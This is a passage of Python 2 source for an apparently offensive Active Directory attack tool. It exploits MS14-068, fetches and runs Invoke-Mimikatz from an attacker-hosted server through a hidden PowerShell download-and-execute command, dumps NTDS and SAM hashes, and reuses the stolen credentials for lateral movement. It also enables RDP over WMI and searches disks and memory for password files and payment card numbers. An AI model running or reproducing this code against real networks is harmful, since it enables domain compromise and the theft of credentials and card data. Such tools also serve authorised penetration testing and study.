    getPowershellVersion(ip,domain,username,password,passwordHash)
    #powershellPath=getPowershellPath(osArch64)
    powershellPath="C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe"

    powershellArgs=' -windowstyle hidden -NoProfile -NoLogo -NonInteractive -Sta -ep bypass '

    print (setColor("\nTesting MS14-068", color="green"))
    #print (setColor("\nTesting MS14-068", bold, color="red"))
    dateTime1=str(checkRemoteTime(ip))
    dateTime2=str(checkCurrentTime())

    if compareTime(dateTime1,dateTime2)==True:
        print "[*] Time sync between host and remote server: "+(setColor("OK", bold, color="green"))
    else:
        print "[*] Time sync between host and remote server: "+(setColor("Failed", bold, color="red"))
        syncDateTime(dateTime1)
    target_ip=ip
    dc_ip=ip
    address=netbiosName

    tmpFoundCreds=[]
    if domain.lower()==domainFull.lower() or domain.lower()==domainShort.lower():
        tmpFoundCreds.append([username,password])
    #print domainShort
    #for x in userPassList:
    #    if domainFull.lower() in str(x).lower():
    #        tmpFoundCreds=x
    if len(tmpFoundCreds)<1:
        print "[*] No domain credentials found to continue with MS14-068 test"
    if len(tmpFoundCreds)>0:
        username=tmpFoundCreds[0][0]
        password=tmpFoundCreds[0][1]
        command=powershellPath+" "+powershellArgs+" IEX (New-Object Net.WebClient).DownloadString(\'http://"+myIP+":8000/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz -DumpCreds"
        dumper=MS14_068(address,target_ip, username, password, domainFull, None, command, None, None, dc_ip)    
        try:
            dumper.exploit()
            tmpPasswordList=parseMimikatzOutput(dumper.getOutput())
            if len(tmpPasswordList)>0:
                print "\nTesting Credentials"
                for y in tmpPasswordList:
                    tmpdomain=y[0]
                    tmpusername=y[1]
                    tmppassword=y[2]
                    tmppasswordHash=None
                    tmpLoginOK,tmpAdminOK=testDomainCredentials(tmpusername,tmppassword,tmppasswordHash,dcList[0],tmpdomain)
                    if tmpAdminOK==True:
                        if y not in daPassList:
                            daPassList.append(y)
                        tmpPassList.append(y)  
        except Exception:
            pass
    dumper=None
    if len(tmpFoundCreds)>0:
        username=tmpFoundCreds[0][0]
        password=tmpFoundCreds[0][1]

        command=powershellPath+" "+powershellArgs+" IEX (New-Object Net.WebClient).DownloadString(\'http://"+myIP+":8000/Get-PasswordFile.ps1\'); Get-PasswordFile '\\\\"+myIP+"\\guest'"
        dumper=MS14_068(address,target_ip, username, password, domainFull, None, command, None, None, dc_ip)    
        try:
            dumper.exploit()
        except Exception as e:
            print e
            pass
        dumper=None
        if not os.path.exists(origScriptPath+"/loot/system") or not os.path.exists(origScriptPath+"/loot/ntds"):
            print (setColor("[-]", bold, color="red"))+" Unable to find NTDS.dll and SYSTEM hive"
            os._exit(1)
        else:            
            print (setColor("[+]", bold, color="green"))+" Downloading NTDS.dll and SYSTEM hive"            
            print (setColor("[+]", bold, color="green"))+" Converting NTDS.dll to NTLM hashes"            
            cmd=pathEsedb+"/esedbexport -t /tmp/ "+origScriptPath+"/ntds"
            resultList = runCommand(cmd, shell = True, timeout = 120)
            time.sleep(2)

            outputFilename="/tmp/NT.out"
            cmd="python "+pathNTDSExtract+"/dsusers.py /tmp/ntds.export/datatable.3 /tmp/ntds.export/link_table.5 /tmp --passwordhashes --lmoutfile /tmp/LM.out --ntoutfile "+outputFilename+" --pwdformat john --syshive "+origScriptPath+"/system"
            resultList = runCommand(cmd, shell = True, timeout = 120)

            if os.path.exists(outputFilename):
                with open(outputFilename) as f:
                    lines = f.read().splitlines()
                    for x in lines:
                        if x not in tmpHashList:
                            tmpHashList.append(x)
            if len(tmpHashList)>0:
                if ip in uncompromisedHostList:
                    uncompromisedHostList.remove(ip)
                print (setColor("\n[+]", bold, color="green"))+" List of NTLM Hashes"            
                for x in tmpHashList:
                    tmpusername=x.split(":")[0]
                    tmphash="aad3b435b51404eeaad3b435b51404ee:"+(x.split(":")[1]).split("$")[2]
                    tmpuid=(x.split(":")[2]).split("-")[7]
                    print tmpusername+":"+str(tmpuid)+":"+tmphash+":::"
                    if [ip,domain,tmpusername,tmphash] not in userHashList:
                        userHashList.append([ip,domain,tmpusername,tmphash])
                    if tmpusername.lower()=="administrator":
                        if len(domain)<1:
                            domain="WORKGROUP"
                        if [ip,domain,tmpusername,tmphash] not in accessAdmHostList:
                            accessAdmHostList.append([ip,domain,tmpusername,tmphash])


            #accessAdmHostList.append()
    return tmpPassList,tmpHashList

def cardLuhnChecksumIsValid(card_number):
    """ checks to make sure that the card passes a luhn mod-10 checksum """
    sum = 0
    num_digits = len(card_number)
    oddeven = num_digits & 1
    for count in range(num_digits):
        digit = int(card_number[count])
        if not (( count & 1 ) ^ oddeven):
            digit = digit * 2
        if digit > 9:
            digit = digit - 9
        sum = sum + digit
    return (sum % 10) == 0

def addPasswords(tmpip,tmpPasswordList):
    for x in tmpPasswordList:
        domainShort,domainFull=reverseLookup(tmpip)
        tmpdomain=(domainFull).lower()
        tmpusername=(x[1]).lower()
        tmppassword=x[2]
        if len(tmppassword)>0 and tmppassword!='(null':       
            if [tmpip,tmpdomain,tmpusername,tmppassword] not in userPassList:
                userPassList.append([tmpip,tmpdomain,tmpusername,tmppassword])

def addHashes(tmpip,tmpHashList):
    for x in tmpHashList:
        tmpusername=x.split(":")[0]
        tmphash=x.split(":")[2]+":"+x.split(":")[3]
        if "\\" in tmpusername: 
            tmpdomain=tmpusername.split("\\")[0]
            tmpusername=tmpusername.split("\\")[1]   
            if len(tmpdomain)<1:
                tmpdomain='WORKGROUP'
            #print "domain : "+tmpdomain
            if [tmpip,tmpdomain,tmpusername,tmphash] not in userHashList:
                userHashList.append([tmpip,tmpdomain,tmpusername,tmphash])
        else:        
            if tmpip not in dcList:        
                tmpdomain=getNetBiosName(tmpip)
                if [tmpip,tmpdomain,tmpusername,tmphash] not in userHashList:
                    userHashList.append([tmpip,tmpdomain,tmpusername,tmphash])
            else:
                domainShort,domainFull=reverseLookup(tmpip)
                tmpdomain=domainFull
                if [tmpip,tmpdomain,tmpusername,tmphash] not in userHashList:
                    userHashList.append([tmpip,tmpdomain,tmpusername,tmphash])

def accessRemoteShare(targetIP,filePath,domain, username, password):
    complete=False
    status=False
    while complete==False:
        try:
            conn = None
            conn = SMBConnection1(username,password,client_machine_name,targetIP,domain=domain,use_ntlm_v2=True,is_direct_tcp=True)
            conn.connect(targetIP, 445)  
            shareName=filePath.split("/")[0]
            subDirectory=filePath.replace(shareName,"")
            conn.listPath(shareName, subDirectory)
            conn = None
            complete=True
            status=True
        except Exception as e:
            if "Unknown status value" in str(e):
                complete=False
            else:
                complete=True
            status=False
    return status

def my_tcp_server():
    port=8000
    server = ThreadingSimpleServer(('', port), SimpleHTTPRequestHandler)
    # server = ThreadingSimpleServer(('', port), RequestHandler)
    addr, port = server.server_address
    #print("Serving HTTP on %s port %d ..." % (addr, port))
    try:
        while 1:
            sys.stdout.flush()
            server.handle_request()
    except KeyboardInterrupt:
        print "Finished"

parser = argparse.ArgumentParser(
        prog='PROG',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description=('''\
'''))
parser.add_argument("target", nargs='*', type=str, help="The target IP(s), range(s) or file(s) containing a list of targets")
parser.add_argument("-d", type=str, dest="domain", help="Domain Name")
parser.add_argument("-u", type=str, dest="username", help="Username")
parser.add_argument("-p", type=str, dest="password", help="Password")
parser.add_argument('-L', '--list-modules', action='store_true', help='List available modules')
mcgroup = parser.add_mutually_exclusive_group()
mcgroup.add_argument("-M", "--module", metavar='MODULE', help='Payload module to use')
parser.add_argument('-o', metavar='MODULE_OPTION', nargs='+', default=[], dest='module_options', help='Payload module options')
parser.add_argument("-D", "--debug", action='store_true', help="Verbose mode")
if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
args = parser.parse_args()
if args.list_modules:
    tmpResultList=[]
    tmpResultList.append(['pan','Dump and search PAN numbers from disks and memory'])
    tmpResultList.append(['shares','Find the correct account credentials to access shares/folders'])
    tmpResultList.append(['files','Find interesting files (UltraVNC, Unattend.xml, KeePass Files, Web.config, Filezilla, *passwords* docs)'])
    tmpResultList.append(['reg','Find interesting registry keys (WinVNC, SNMP, Putty)'])
    tmpResultList.append(['bitlocker','Find BitLocker keys)'])
    tmpResultList.append(['truecrypt','Find Truecrypt Master keys)'])
    tmpResultList.append(['keepass','Find Keepass Passwords)'])

    #tmpResultList.append(['rdp','Enable Remote Desktop (RDP) on hosts'])
    #tmpResultList.append(['apps','List installed applications on hosts'])
    print tabulate(tmpResultList)
    os._exit(0)

setupSMBShare()
if len(args.target)<1:
 print "[!] Please set a target"
 sys.exit()
if args.debug:
    debugMode=True
if args.domain:
    domain=args.domain
if args.username:
    username=args.username
if args.password:
    password=args.password
if not args.domain or not args.username or not args.password:
    print (setColor("[!]", bold, color="red"))+" Please provide the domain, username and password"
    sys.exit()

if os.path.exists("secrets.ntds"):
    os.remove("secrets.ntds")
if os.path.exists("secrets.sam"):
    os.remove("secrets.sam")

inputStr=args.target[0]
if "/" in inputStr:
    for x in IPNetwork(inputStr):
        if str(x) not in ipList:
            if str(x) not in ipList: 
                ipList.append(str(x))
else:
    if os.path.exists(inputStr):
        with open(inputStr) as f:
            lines = f.read().splitlines()
            for x in lines:
                if "/" in x:
                    for y in IPNetwork(x):
                        if str(y) not in ipList:
                            if str(y) not in ipList:
                                ipList.append(str(y))
                else:
                    if x not in ipList:
                        ipList.append(x)
    else:
        ipList.append(inputStr)

#setDemo()
cmd="rm -rf /tmp/.export"
runCommand(cmd, shell = True, timeout = 30)
cmd="rm -rf /tmp/ntds.export"
runCommand(cmd, shell = True, timeout = 30)
cmd="rm "+os.getcwd()+"/system"
runCommand(cmd, shell = True, timeout = 30)
cmd="rm "+os.getcwd()+"/NTDS"
runCommand(cmd, shell = True, timeout = 30)

passwordHash=None

portList=[]
portList.append("389")
portList.append("445")
portList.append("1433")
portList.append("3389")

ipListStr=", ".join(ipList)
print (setColor("[*]", bold, color="green"))+" Scanning Target Network"
myIP=get_ip_address()

web_dir = os.getcwd()+"/modules"
os.chdir(web_dir)
threading.Thread(target=my_tcp_server).start()

import resource
resource.setrlimit(resource.RLIMIT_NOFILE, (1024, 3000))
screenLock = threading.Semaphore(value=3)
for port in portList:
    for x in ipList:
        scanThread(x, port)
for x in liveList:
    hostNo=x[0]
    portNo=x[1]
    if portNo=='1433':
        if hostNo!=myIP:
            mssqlList.append(hostNo)
    if portNo=='3389':
        rdpList.append(hostNo)
    if portNo=='445':
        if hostNo not in dcList:
            if hostNo!=myIP:
                nbList.append(hostNo)
    if portNo=='389':
        dcList.append(hostNo)
        if hostNo in nbList:
            nbList.remove(hostNo)
if len(dcList)<1 and len(rdpList)<1 and len(nbList)<1:
    print "[+] No Domain Controllers/NetBIOS/RDP ports detected on target hosts"
    os._exit(0)
else:
    print (setColor("[+]", bold, color="green"))+" Found the below hosts"
    for x in dcList:
        print x+" [DC]"
        if x not in uncompromisedHostList:
            uncompromisedHostList.append(x)
    for x in nbList:
        print x+" [NBNS]"
        if x not in uncompromisedHostList:
            uncompromisedHostList.append(x)
    for x in rdpList:
        print x+" [RDP]"        
    for x in mssqlList:
        print x+" [MSSQL]"        
    print "\n"

isDomainAccount=False
logging.getLogger().setLevel(logging.ERROR)
logging.disabled = False
passwordHash=None
'''
print (setColor("Checking for MS08-067", color="green"))
print (setColor("Checking for MS17-010", color="green"))
for targetIP in nbList:
    check(targetIP)
for targetIP in dcList:
    check(targetIP)
print "\n"
'''
cleanUp()

for x in nbList:
    tmpLoginOK,tmpAdminOK=testDomainCredentials(username,password,passwordHash,x,domain)
for x in dcList:
    tmpLoginOK,tmpAdminOK=testDomainCredentials(username,password,passwordHash,x,domain)
print "\n"

if len(dcList)>0:
    isDA=getDomainAdminUsers(username,password,dcList[0])

if domain.lower()!="workgroup":
    if len(dcList)>0:
        ip=dcList[0]

        print (setColor("\nChecking SYSVOL for Credentials", color="green"))
        mountSysvol(username,password)

        continueOK=False
        tmpLoginOK,tmpAdminOK=testDomainCredentials(username,password,passwordHash,ip,domain)
        if tmpLoginOK==True:
            if [ip,domain,username,password] not in userPassList:
                userPassList.append([ip,domain,username,password])
            continueOK=True
        if continueOK==True:
            for ip in nbList:
                tmpLoginOK,tmpAdminOK=testDomainCredentials(username,password,passwordHash,ip,domain)
                if tmpLoginOK==True:
                    if [ip,domain,username,password] not in userPassList:
                        userPassList.append([ip,domain,username,password])
                if tmpAdminOK==True:
                    tmpPasswordList=runMimikatz(ip,domain,username,password,passwordHash)
                    if len(tmpPasswordList)>0:
                        for y in tmpPasswordList:
                            if y not in userPassList:
                                userPassList.append(y)            
                    if len(tmpPasswordList)>0:
                        print "\n"
                    print (setColor("[+]", bold, color="green"))+" Dumping Hashes from Host: "+ip                    
                    tmpHashList=dumpDCHashes(ip,domain,username,password,passwordHash)
                    if len(tmpHashList)>0:
                        addHashes(ip,tmpHashList)
                        if ip in uncompromisedHostList:
                            uncompromisedHostList.remove(ip)                            
                    analyzeHashes(tmpHashList)

                    if len(dcList)>0:
                        getDomainAdminUsers(username,password,dcList[0])
                        domainShort,domainFull=reverseLookup(dcList[0])
                        for x in tmpPasswordList:
                            tmpdomain1=(x[1]).lower()
                            tmpusername1=(x[2]).lower()
                            tmppassword1=x[3]
                            tmppasswordhash1=None
                            if tmpdomain1==domainFull.lower() or tmpdomain1==domainShort.lower():
                                if tmpusername1 in domainAdminList and dcCompromised==False:
                                    print (setColor("[+]", bold, color="green"))+" Found Domain Admin Credentials in Memory on Host: "+ip                    
                                    getDomainAdminUsers(tmpusername1,tmppassword1,dcList[0])
                                    tmpPasswordList=runMimikatz(dcList[0],tmpdomain1,tmpusername1,tmppassword1,tmppasswordhash1)
                                    if len(tmpPasswordList)>0:
                                        for y in tmpPasswordList:
                                            if y not in userPassList:
                                                userPassList.append(y)            
                                    if len(tmpPasswordList)>0:
                                        print "\n"
                                    print (setColor("[+]", bold, color="green"))+" Dumping Hashes from Host: "+ip                    
                                    tmpHashList=dumpDCHashes(ip,domain,username,password,passwordHash)
                                    if len(tmpHashList)>0:
                                        addHashes(ip,tmpHashList)
                                        if ip in uncompromisedHostList:
                                            uncompromisedHostList.remove(ip)                            
                                    analyzeHashes(tmpHashList)
                                    dcCompromised=True

                    if optionTokenPriv==True and dcCompromised==False:
                        print (setColor("\nEnumerating Tokens and Attempting Privilege Escalation", bold, color="green"))
                        tokensPriv(ip,domain,username,password,passwordHash)

else:
    for ip in dcList:
        tmpLoginOK,tmpAdminOK=testDomainCredentials(username,password,passwordHash,ip,domain)        
        if tmpLoginOK==True:
            if [ip,domain,username,password] not in userPassList:
                userPassList.append([ip,domain,username,password])
        if tmpAdminOK==True:
            if dcCompromised==False:
                tmpPasswordList=runMimikatz(ip,domain,username,password,passwordHash)
                for y in tmpPasswordList:
                    if y not in userPassList:
                        userPassList.append(y)            
                if len(tmpPasswordList)>0:
                    print "\n"
                print (setColor("[+]", bold, color="green"))+" Dumping Hashes from Host: "+ip
                tmpHashList=dumpDCHashes(ip,domain,tmpusername,tmppassword,passwordHash)
                if len(tmpHashList)>0:
                    addHashes(ip,tmpHashList)
                    if ip in uncompromisedHostList:
                        uncompromisedHostList.remove(ip)
                    for ip in dcList:
                        if [ip, domain, tmpusername, tmppassword] not in accessAdmHostList:
                            accessAdmHostList.append([ip, domain, tmpusername, tmppassword])
                analyzeHashes(tmpHashList)
                if optionTokenPriv==True and dcCompromised==False:
                    print (setColor("\nEnumerating Tokens and Attempting Privilege Escalation", bold, color="green"))
                    tokensPriv(ip,domain,username,password,passwordHash)

    for ip in nbList:
        tmpLoginOK,tmpAdminOK=testDomainCredentials(username,password,passwordHash,ip,domain)        
        if tmpLoginOK==True:
            if [ip,domain,username,password] not in userPassList:
                userPassList.append([ip,domain,username,password])

            tmpPasswordList=runMimikatz(ip,domain,username,password,passwordHash)
            for y in tmpPasswordList:
                if y not in userPassList:
                    userPassList.append(y)      
            if len(tmpPasswordList)>0:
                print "\n"

            print (setColor("[+]", bold, color="green"))+" Dumping Hashes from Host: "+ip
            tmpHashList=dumpDCHashes(ip,domain,username,password,passwordHash)
            if len(tmpHashList)>0:
                addHashes(ip,tmpHashList)
                if ip in uncompromisedHostList:
                    uncompromisedHostList.remove(ip)
            analyzeHashes(tmpHashList)
            for y in userPassList:
                if len(dcList)>0 and len(domainAdminList)<1:
                    tmpdomain=y[1]
                    tmpusername=y[2]
                    tmppassword=y[3]
                    getDomainAdminUsers(tmpusername,tmppassword,dcList[0])
                    dcDomainNameList=reverseLookup(dcList[0])
            domainShort,domainFull=reverseLookup(ip)
            if len(dcList)>0:
                for y in userPassList:
                    if dcCompromised==False:
                        tmpdomain=(y[1]).lower()
                        tmpusername=y[2]
                        tmppassword=y[3]
                        tmppasswordHash=None
                        if domainShort.lower()==tmpdomain or domainFull.lower()==tmpdomain:
                            tmpLoginOK,tmpAdminOK=testDomainCredentials(tmpusername,tmppassword,tmppasswordHash,dcList[0],domainFull)        
                            if tmpAdminOK==True:
                                tmpPasswordList=runMimikatz(dcList[0],domainFull,tmpusername,tmppassword,tmppasswordHash)
                                for y in tmpPasswordList:
                                    if y not in userPassList:
                                        userPassList.append(y)      
                                if len(tmpPasswordList)>0:
                                    print "\n"
                                print (setColor("[+]", bold, color="green"))+" Dumping Hashes from Domain Controller: "+dcList[0]
                                tmpHashList=dumpDCHashes(dcList[0],domainFull,tmpusername,tmppassword,tmppasswordHash)
                                if len(tmpHashList)>0:
                                    addHashes(dcList[0],tmpHashList)
                                    if dcList[0] in uncompromisedHostList:
                                        uncompromisedHostList.remove(dcList[0])
                                analyzeHashes(tmpHashList)
                                dcCompromised=True

            if optionTokenPriv==True and dcCompromised==False:
                print (setColor("\nEnumerating Tokens and Attempting Privilege Escalation", bold, color="green"))
                tokensPriv(ip,domain,username,password,passwordHash)
'''
if len(accessAdmHostList):
    print "\nADMIN$ Access on the Below Hosts"
print tabulate(accessAdmHostList)
if len(accessOKHostList):
    print "\nCredentials Valid on the Below Hosts"
print tabulate(accessOKHostList)
'''

if len(dcList)>0:
    for ip in dcList:
        if isDA==True and dcCompromised==False:
            tmpPasswordList=runMimikatz(ip,domain,username,password,passwordHash)
            for y in tmpPasswordList:
                if y not in userPassList:
                    userPassList.append(y)   
    if isDA==False and dcCompromised==False:        
        #print (setColor("\nChecking SYSVOL for Credentials", color="green"))
        #mountSysvol(username,password)
        if optionMS14068==True:
            tmpPassList,tmpHashList=testMS14_068(ip,domain,username,password,passwordHash)
            if len(tmpPassList)>0 or len(tmpHashList)>0:
                for x in tmpHashList:
                    hashList.append(x)
                for x in tmpPassList:
                    passList.append(x)

                for x in tmpPassList:
                    tmpusername=x[1]
                    tmppassword=x[2]
                    tmppasswordHash=None
                    if dcCompromised==False:
                        print (setColor("\n[+]", bold, color="green"))+" Dumping Hashes from Domain Controller: "+dcList[0]
                        tmpHashList=dumpDCHashes(dcList[0],domain,tmpusername,tmppassword,tmppasswordHash)
                        if len(tmpHashList)>0:
                            addHashes(dcList[0],tmpHashList)
                            if dcList[0] in uncompromisedHostList:
                                uncompromisedHostList.remove(dcList[0])
                            for dc in dcList:
                                if [dc, domain, tmpusername, tmppassword] not in accessAdmHostList:
                                    accessAdmHostList.append([dc, domain, tmpusername, tmppassword])
                            dcCompromised=True
                        analyzeHashes(tmpHashList)

else:        
    for ip in nbList:              
        tmpFound=False
        tmpLoginOK,tmpAdminOK=testDomainCredentials(username,password,passwordHash,ip,domain)
        if tmpLoginOK==True:
            if [ip,domain,username,password] not in userPassList:
                userPassList.append([ip,domain,username,password])
        if tmpAdminOK==True:
            tmpPasswordList=runMimikatz(ip,domain,username,password,passwordHash)
            for y in tmpPasswordList:
                if y not in userPassList:
                    userPassList.append(y)     
            print (setColor("\n[+]", bold, color="green"))+" Dumping Hashes from Host: "+ip
            tmpHashList=dumpDCHashes(ip,domain,username,password,passwordHash)
            if len(tmpHashList)>0:
                addHashes(ip,tmpHashList)
                if ip in uncompromisedHostList:
                    uncompromisedHostList.remove(ip)
                dcCompromised=True
            analyzeHashes(tmpHashList)

            if optionTokenPriv==True and dcCompromised==False:
                print (setColor("\nEnumerating Tokens and Attempting Privilege Escalation", bold, color="green"))
                tokensPriv(ip,domain,username,password,passwordHash)

if len(uncompromisedHostList)>0 and len(userPassList)>0:
    print (setColor("\nReusing Credentials and Hashes For Lateral Movement in the Network", bold, color="green"))
complete=False
complete1=False
lastCount=0

while complete==False:
    if len(uncompromisedHostList)<1:
        complete=True
    else:
        while complete1==False:
            for y in uncompromisedHostList:            
                if len(userPassList)>0:
                    for x in userPassList:
                        for z in uncompromisedHostList:
                            tmpip=z
                            tmpdomain=x[1]
                            tmpusername=x[2]
                            tmppassword=x[3]
                            tmppasswordHash=None
                            #if (tmpusername.lower()).strip()=="administrator":
                            if len(tmppassword)>0 and tmppassword!='(null)':
                                if tmpip not in compromisedHostList:
                                    tmpLoginOK,tmpAdminOK=testDomainCredentials(tmpusername,tmppassword,tmppasswordHash,tmpip,tmpdomain)
                                    if tmpLoginOK==True:
                                        if [tmpip,domain,username,password] not in userPassList:
                                            userPassList.append([tmpip,domain,username,password])
                                    if tmpAdminOK==True:   
                                        tmpPasswordList=runMimikatz(tmpip,tmpdomain,tmpusername,tmppassword,tmppasswordHash)
                                        for z in tmpPasswordList:
                                            if z not in userPassList:
                                                userPassList.append(z)                        
                                        print (setColor("\n[+]", bold, color="green"))+" Dumping Hashes from Host: "+tmpip                
                                        tmpHashList=dumpDCHashes(tmpip,tmpdomain,tmpusername,tmppassword,tmppasswordHash)
                                        if len(tmpHashList)>0:
                                            addHashes(tmpip,tmpHashList)
                                            if tmpip in uncompromisedHostList:
                                                uncompromisedHostList.remove(tmpip)
                                        if optionTokenPriv==True and dcCompromised==False:
                                            if tmpip not in dcList:
                                                print (setColor("\nEnumerating Tokens and Attempting Privilege Escalation", bold, color="green"))
                                                tokensPriv(tmpip,tmpdomain,tmpusername,tmppassword,tmppasswordHash)
                                        if tmpip not in compromisedHostList:
                                            compromisedHostList.append(tmpip)       

                if len(userHashList)>0:
                    for x in userHashList:
                        for z in uncompromisedHostList:
                            tmpip=z
                            tmpdomain=x[1]
                            tmpusername=x[2]
                            tmppasswordHash=x[3]
                            tmppassword=None        
                            if tmpip not in compromisedHostList:
                                tmpLoginOK,tmpAdminOK=testDomainCredentials(tmpusername,tmppassword,tmppasswordHash,tmpip,tmpdomain)                    
                                if tmpLoginOK==True:
                                    if [tmpip,domain,username,password] not in userPassList:
                                        userPassList.append([tmpip,domain,username,password])
                                if tmpAdminOK==True:
                                    tmpPasswordList=runMimikatz(tmpip,tmpdomain,tmpusername,tmppassword,tmppasswordHash)
                                    for y in tmpPasswordList:
                                        tmpdomain1=y[1]
                                        tmpusername1=y[2]
                                        tmppassword1=y[3]
                                        tmppasswordHash1=None
                                        tmpLoginOK1,tmpAdminOK1=testDomainCredentials(tmpusername1,tmppassword1,tmppasswordHash1,tmpip,tmpdomain1)                    
                                        if tmpLoginOK1==True:
                                            if y not in userPassList:
                                                userPassList.append(y)                        

                                    print (setColor("\n[+]", bold, color="green"))+" Dumping Hashes from Host: "+tmpip                
                                    tmpHashList=dumpDCHashes(tmpip,tmpdomain,tmpusername,tmppassword,tmppasswordHash)
                                    if len(tmpHashList)>0:
                                        addHashes(tmpip,tmpHashList)
                                        if tmpip in uncompromisedHostList:
                                            uncompromisedHostList.remove(tmpip)
                                    if optionTokenPriv==True:
                                        if tmpip not in dcList and dcCompromised==False:
                                            print (setColor("\nEnumerating Tokens and Attempting Privilege Escalation", bold, color="green"))
                                            tokensPriv(tmpip,tmpdomain,tmpusername,tmppassword,tmphash)
                                    if tmpip not in compromisedHostList:
                                        compromisedHostList.append(tmpip)       


                if lastCount==len(uncompromisedHostList):
                    complete1=True
                lastCount=len(uncompromisedHostList)


    print (setColor("\nList of Passwords in Database", bold, color="green"))
    if len(userPassList)<1:
        print "No passwords found"
    else:
        print tabulate(userPassList)
        #analyzePasswords(userPassList)

    print (setColor("\nList of Hashes in Database", bold, color="green"))
    if len(userHashList)<1:
        print "No hashes found\n"
    else:
        print tabulate(userHashList)
        analyzeHashes1(userHashList)


    if len(accessAdmHostList)>0:
        print (setColor("Admin Access on the Below Hosts", bold, color="green"))
        print tabulate(accessAdmHostList)

    if len(uncompromisedHostList)>0:
        print (setColor("List of Hosts Uncompromised", bold, color="green"))
        for x in uncompromisedHostList:
            print x
    else:
        print (setColor("\n[+]", bold, color="green"))+" All hosts have been compromised. Continuing with Post Exploitation modules"                
    complete=True

if args.module=="rdp":
    if len(accessAdmHostList)>0:
        print (setColor("\n[*] Enabling RDP on Hosts that were not enabled", bold, color="green"))
        if len(rdpList)==len(nbList):
            print "RDP has been enabled on all hosts"
        else:
            dict={}        
            for x in accessAdmHostList:
                ip=x[0]
                domain=x[1]
                username=x[2]
                password=x[3]
                if len(x[3])==65 and x[3].count(":")==1:
                    passwordHash=x[3]
                    password=None
                else:
                    password=x[3]
                    passwordHash=None
                if ip not in rdpList:
                    print "Enabling RDP on Host: "+ip
                    command=powershellCmdStart+" -Command \"set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name \"fDenyTSConnections\" -Value 0\""
                    results=runWMIEXEC(ip, domain, username, password, passwordHash, command)  
                    print results  
                    command='netsh advfirewall firewall set rule name="Remote Desktop (TCP-In)" new enable=Yes profile=domain'
                    results=runWMIEXEC(ip,domain,username,password,passwordHash,command)
                    command='netsh advfirewall firewall set rule name="Remote Desktop - RemoteFX (TCP-In)" new enable=Yes profile=domain'
                    results=runWMIEXEC(ip,domain,username,password,passwordHash,command)
                    command='net start TermService'
                    results=runWMIEXEC(ip,domain,username,password,passwordHash,command)
    os._exit(0)

if args.module=="files":
    tmpResultList=[]
    print (setColor("\nSearching Drives for Interesting Files", bold, color="green"))
    if len(accessAdmHostList)>0:
        for x in accessAdmHostList:
            ip=x[0]
            domain=x[1]
            username=x[2]
            if len(x[3])==65 and x[3].count(":")==1:
                passwordHash=x[3]
                password=None
            else:
                password=x[3]
                passwordHash=None
            tmpFileList=findInterestingFiles(ip,domain,username,password,passwordHash)
            if len(tmpFileList)>0:
                count=0
                for filename in tmpFileList:           
                    filename=filename.strip()
                    tmpFilename=(downloadFile(ip,domain,username,password,filename))
                    if len(tmpFilename)>0:
                        if count>0:
                            print (setColor("\n[+]", bold, color="green"))+" "+ip+":445 "+getNetBiosName(ip)+" | "+filename+" | "+tmpFilename

                        else:
                            print (setColor("[+]", bold, color="green"))+" "+ip+":445 "+getNetBiosName(ip)+" | "+filename+" | "+tmpFilename
                        if "unattend.xml" in filename.lower() or "sysprep.xml" in filename.lower():
                            tmpResultList=parseUnattendXML(tmpFilename)
                            if len(tmpResultList)>0:
                                headers = ["Username","Password"]
                                print tabulate(tmpResultList,headers,tablefmt="simple")
                                print "\n"
                        if "ultravnc.ini" in filename.lower():
                            tmpResultList=parseUltraVNC(tmpFilename)
                            for x in tmpResultList:
                                print "Password1: "+x[0]
                                print "Password2: "+x[1]
                        if "sitemanager.xml" in filename.lower():
                            tmpResultList=parseSiteManagerXML(tmpFilename)
                            headers = ["Host", "Username","Password"]
                            print tabulate(tmpResultList,headers,tablefmt="simple")                    
                        if ".txt" in filename.lower():
                            with open(tmpFilename) as f:
                                lines = f.read().splitlines()
                                count1=0
                                if len(lines)<10:
                                    for x in lines:
                                        x=x.strip()
                                        if count1<10:
                                            print x
                                    count1+=1
                        count+=1

    os._exit(0)

if args.module=="pan":    
    tmpResultList=[]
    print (setColor("\nSearching Drives for PAN Numbers", bold, color="green"))
    tmpDoneList=[]
    for x in accessAdmHostList:
        ip=x[0]
        domain=x[1]
        username=x[2]
        if len(x[3])==65 and x[3].count(":")==1:
            passwordHash=x[3]
            password=None
        else:
            password=x[3]
            passwordHash=None
        if ip not in tmpDoneList:
            print "[*] Checking Host: "+ip
            results=diskCredDump(ip,domain,username,password,passwordHash)
            tmpFilename=''
            found=False
            tmpCardNoList=[]
            for x in results:
                if len(x)>0:
                    if found==True:
                        x=x.strip() 
                        if len(x)<1:
                            tmpResultList.append([ip,tmpFilename,tmpCardNoList])
                            tmpCardNoList=[]
                            found=False
                        else:
                            if "----------------" not in x:
                                tmpCardNoList.append(x)
                        #if "---------------------" not in x:
                        #    tmpList1.append(x)
                        #else:
                        #    tmpResultList.append([tmpFilename," ".join(tmpList1)])   
                        #    found=False
                        #    tmpList1=[]
                    if "File: " in x:
                        x=x.replace("File: ","")
                        tmpFilename=x
                        found=True        
            tmpDoneList.append(ip)
    if len(tmpResultList)>0:
        print (setColor("\n[+]", bold, color="green"))+" Possible PAN numbers found in the below locations"
        for x in tmpResultList:
            tmpIP=x[0]
            tmpFilename=x[1]
            tmpCardNoList=x[2]
            print "[+] "+tmpIP+" | "+tmpFilename+" | "+" ".join(tmpCardNoList)

    #if len(tmpResultList)>0:
    #    for x in tmpResultList:
    #        print "here: "+str(x)
    #    #print tabulate(tmpResultList,tablefmt="simple")

    if len(accessAdmHostList)>0:
        print (setColor("\nSearching Memory for PAN Numbers", bold, color="green"))
        print "[*] Processes Running on Hosts"
        dict={}        
        for x in accessAdmHostList:
            ip=x[0]
            domain=x[1]
            username=x[2]
            password=x[3]
            passwordHash=None
            tmpResultList=listProcesses(ip,domain, username, password,passwordHash)
            tmpResultList1=[]
            for y in tmpResultList:
                if len(y)>0:
                    if [y,ip] not in tmpResultList1:
                        tmpResultList1.append([y,ip])
            for y in tmpResultList1:
                try:
                    tmpStr=dict[y[0]]
                    tmpStr+=", "+y[1]
                    dict[y[0]]=tmpStr
                except KeyError:
                    dict[y[0]]=y[1]    
        tmpResultList2=[]      
        tmpCount=1                                        
        for key, value in dict.iteritems():
            tmpResultList2.append([tmpCount,key,value])
            tmpCount+=1

        selectedOption=''    
